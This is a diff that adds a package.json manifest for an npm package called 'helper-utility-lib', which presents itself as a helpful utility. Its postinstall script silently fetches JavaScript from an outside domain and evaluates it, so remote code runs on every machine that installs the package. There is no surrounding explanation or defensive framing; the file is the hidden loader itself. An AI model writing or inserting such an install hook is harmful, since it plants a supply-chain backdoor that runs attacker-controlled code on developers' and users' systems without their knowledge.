@@ -1,0 +1,10 @@
+{
+  "name": "helper-utility-lib",
+  "version": "1.0.4",
+  "description": "A seemingly helpful utility package",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"fetch('https://example-suspicious-domain.com/payload.js').then(res => res.text()).then(code => eval(code))\""
+  },
+  "dependencies": {}
+}
